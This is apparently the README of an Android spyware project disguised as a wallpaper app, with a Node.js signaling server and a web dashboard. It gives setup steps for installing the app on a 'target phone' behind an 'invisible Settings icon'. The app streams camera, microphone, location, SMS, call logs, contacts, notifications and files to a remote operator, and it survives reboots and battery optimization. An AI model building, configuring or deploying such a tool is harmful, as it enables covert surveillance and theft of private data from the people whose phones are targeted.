## 🌟 Architectural Overview

This system utilizes a hybrid peer-to-peer and client-server architecture:
1. **Android Client (Java/Kotlin Interoperability)**: Runs a persistent, foreground-priority streaming service that hooks into device hardware (Camera2 API, AudioRecord, LocationManager, SensorManager, ClipboardManager, PackageManager).
2. **Node.js Signaling Server**: Facilitates low-latency signaling exchanges (SDP/ICE candidates) using Socket.IO, manages administrative uploads, and routes remote commands.
3. **Glassmorphic Web Dashboard**: A premium, real-time control room built with fluid glassmorphism, responsive controls, canvas-based sensor charts, and live media pipelines.

## 🚀 Setup & Installation Instructions

This section outlines how to set up the Firebase integration, compile the APK, run the signaling server, and pair the device.

### 1️⃣ Firebase Integration (CRITICAL)

The application relies on Google Firebase services for authentication, notification triggers, and telemetry synchronization. 

> [!IMPORTANT]
> **Do NOT commit your `google-services.json` to any public repository!** 
> If committed, anyone can steal your API keys, run up database bills, or compromise your connected devices. A safety rule has been added to [app/.gitignore](file:///d:/AndroidStudioProjects/WallpaperApplication/app/.gitignore) to prevent accidental pushes.

#### How to set up Firebase for your project:
1. Go to the [Firebase Console](https://console.firebase.google.com/).
2. Click **Add Project** and follow the prompts to create a new project.
3. In your project overview, click the **Android icon** to add an Android app.
4. Enter the Package Name: `com.example.wallpaperapplication`.
5. Enter your debug SHA-1 signing certificate fingerprint (optional but recommended for security).
   * *To get your debug SHA-1, open a terminal in the project directory and run `./gradlew signingReport`.*
6. Register the app, then click **Download google-services.json**.
7. Copy the downloaded `google-services.json` file and place it inside the **`app/`** directory of this project:
   * Path: `Android_WebRTC_Spyware/app/google-services.json`
8. In the Firebase Console, go to **Build → Realtime Database** or **Firestore** (depending on your logging needs) and enable it.
9. Under **Project Settings → API Keys**, make sure to add constraints to restrict your credentials to only run requests from your application package.

### 2️⃣ Configure and Launch the Signaling Server

The Node.js server serves as the communication bridge between the browser dashboard and the Android client.

#### Navigate to Server:
```bash
cd Android-WebRTC-Spyware-Server
```

#### Install Dependencies:
Make sure you have Node.js 16+ installed. Install the server requirements:
```bash
npm install
```

#### Configure Server WebRTC Settings (Optional):
Open `public/client.js` and verify/update your Ice/TURN settings. By default, standard Google STUN servers are configured:
```javascript
const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
    // Add your TURN servers here if accessing the server outside your local network:
    // { urls: 'turn:YOUR_TURN_SERVER', username: 'username', credential: 'password' }
  ]
};
```

#### Start the Server:
```bash
# Run server
node server.js
```
The server will boot and display:
```
✅ Signaling Server started on port 3000
```
To access the Web Dashboard, navigate to `http://<YOUR_SERVER_IP_ADDRESS>:3000` (e.g. `http://localhost:3000` if local).

---

### 3️⃣ Configure and Compile the Android APK

#### Configure the Signaling Endpoint
1. Open the project in **Android Studio**.
2. Open [Constants.java](file:///d:/AndroidStudioProjects/WallpaperApplication/app/src/main/java/com/example/wallpaperapplication/Constants.java).
3. Update `DEFAULT_SOCKET_URL` to point to your Signaling Server's IP address:
   ```java
   public static final String DEFAULT_SOCKET_URL = "http://192.168.1.100:3000"; // Replace with your local/public server IP
   ```

#### Build the APK
* **Via Android Studio UI**: Click **Build → Build Bundle(s) / APK(s) → Build APK(s)**.
* **Via Terminal**: Run the Gradle wrapper script in the root project folder:
  ```powershell
  # Windows Powershell
  .\gradlew assembleDebug
  
  # Linux/macOS
  ./gradlew assembleDebug
  ```
The generated APK will be available at:
`app/build/outputs/apk/debug/app-debug.apk`

## 📱 Device Setup & Permissions

To ensure all background features, sensors, media streams, and file syncs work properly without getting killed by Android's aggressive energy-saver mechanisms, perform the following steps on the target phone:

1. **Install the APK** on the target device.
2. Open the application. Tap the **invisible Settings icon** in the top-right corner of the main screen to enter the **Streaming Settings** menu.
3. Turn the **Streaming Toggle ON**. The app will request permissions:
   * **Camera**: For live streams and snapshot capture.
   * **Microphone**: For audio streaming and two-way talkback.
   * **Location**: For real-time GPS tracking.
   * **Contacts, SMS, Call Logs**: For fetching phone lists and monitoring SMS.
   * **Storage / All Files Access**: Required on Android 11+ to browse and download/upload files from the File Explorer.
4. **Disable Battery Optimization**:
   * Go to **Settings → Apps → Wallpaper Application → Battery**.
   * Change optimization level to **Unrestricted** (prevents Android from killing the background service).
5. **Enable Notification Listener Access**:
   * Go to **Settings → Security & Privacy → Special App Access → Notification Listener Access**.
   * Turn access **ON** for the app to allow the dashboard to capture incoming notifications.

## ⚙️ Persistent Background Strategy

To keep the telemetry streaming service active even when the application is swiped away from memory or if the system undergoes a reboot:
* **Foreground Service**: The app starts a high-priority foreground service with a persistent system tray notification.
* **Boot Restart Receiver**: The `BootReceiver` captures the `ACTION_BOOT_COMPLETED` broadcast, launching the service immediately upon system start.
* **WorkManager Fallback**: A periodic sync worker (`DataSyncWorker`) runs every 15 minutes as a fallback constraint. If the system forcefully shuts down the main process, WorkManager will restart the service components in the background.

---

## 🐛 Debugging & Troubleshooting

### Android Client Logs
Monitor the connection lifecycle and errors using ADB:
```bash
# Monitor only streaming service and WebRTC logs
adb logcat -s StreamingService:V CameraManager:V WebRTC:V
```

* **No Video Stream**: Check if the camera is already in use by another app, and verify that "Camera Access" is enabled globally in the quick settings panel of Android 12+ devices.
* **Talkback Audio Not Heard**: Ensure that the browser's microphone permissions are granted and that the device speaker is not muted.
* **Background Disconnections**: Verify you have exempted the application from Battery Optimization.
